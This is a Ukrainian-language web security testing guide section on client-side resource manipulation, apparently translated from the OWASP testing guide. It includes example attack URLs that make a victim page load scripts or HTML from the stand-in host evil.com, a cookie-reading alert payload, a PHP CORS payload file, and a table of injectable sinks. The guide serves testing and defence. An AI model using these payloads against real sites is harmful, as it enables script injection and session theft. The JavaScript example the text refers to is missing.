
# Тестування маніпуляції ресурсами на стороні клієнта

# Підсумок

Уразливість маніпулювання ресурсами на стороні клієнта є помилкою перевірки вхідних даних. Це відбувається, коли програма приймає керований користувачем вхід, який визначає шлях до ресурсу, наприклад джерело iframe, JavaScript аплет або обробник XMLHttpRequest. Ця вразливість полягає в здатності контролювати URL-адреси, які посилаються на деякі ресурси, присутні на веб-сторінці. Вплив цієї вразливості різний, і зазвичай вона використовується для проведення атак XSS. Ця вразливість дає змогу втручатися в очікувану поведінку програми, змушуючи її завантажувати та відтворювати шкідливі об’єкти.

Наведений нижче код JavaScript показує можливий вразливий скрипт, у якому зловмисник може контролювати location.hash (джерело), який досягає атрибута src елемента cкрипта. Цей окремий випадок призводить до атаки XSS, оскільки зовнішній JavaScript може бути ін’єктований.

Зловмисник може націлитися на жертву, змусивши її відвідати цю URL-адресу: `www.victim.com/#http://evil.com/js.js`, де js.js містить: `alert(document.cookie)`. Це спричинило б спливаюче сповіщення у браузері жертви.

Більш шкідливий сценарій передбачає можливість контролю URL-адреси, викликаної в запиті CORS. Оскільки CORS дозволяє домену-запиту отримати доступ до цільового ресурсу за допомогою підходу на основі заголовка, зловмисник може попросити цільову сторінку завантажити шкідливий вміст з її власного веб-сайту.

Location.hash контролюється введенням користувача та використовується для запиту зовнішнього ресурсу, який потім буде відображено через конструкцію innerHTML. Зловмисник може попросити жертву відвідати таку URL-адресу: `www.victim.com/#http://evil.com/html.html` із обробником корисного навантаження для html.html: 
```
<?php 
      header('Access-Control- Allow-Origin: http://www.victim.com'); 
?> 
<script>alert(document.cookie);</script>
```
# Цілі тесту

- Виявлення приймачів із слабкою перевіркою вхідних даних.
- Оцінка впливу маніпулювання ресурсами.

# Як тестувати

Щоб вручну перевірити наявність такого типу вразливості, ми повинні визначити, чи використовує програма вхідні дані без їх належної перевірки. Якщо так, ці вхідні дані знаходяться під контролем користувача і можуть використовуватися для визначення зовнішніх ресурсів. Оскільки існує багато ресурсів, які можна включити в програму (наприклад, зображення, відео, об’єкти, css та iframe), клієнтські скрипти, які обробляють пов’язані URL-адреси, слід досліджувати на предмет потенційних проблем.

У наступній таблиці показано можливі точки впорскування (заглиблення), які слід перевірити:

| Resource Type 	|           Tag/Method           	| Sink 	|
|:-------------:	|:------------------------------:	|:----:	|
| Frame         	| iframe                         		| src  	|
| Link          	| a                              		| href 	|
| AJAX Request  	| xhr.open(method, [url], true); 	| URL  	|
| CSS           	| link                           		| href 	|
| Image         	| img                            		| src  	|
| Object        	| object                         		| data 	|
| Script        	| script                         		| src  	|

Найбільш цікавими є ті, які дозволяють зловмиснику включити клієнтський код (наприклад, JavaScript), який може призвести до вразливості XSS.
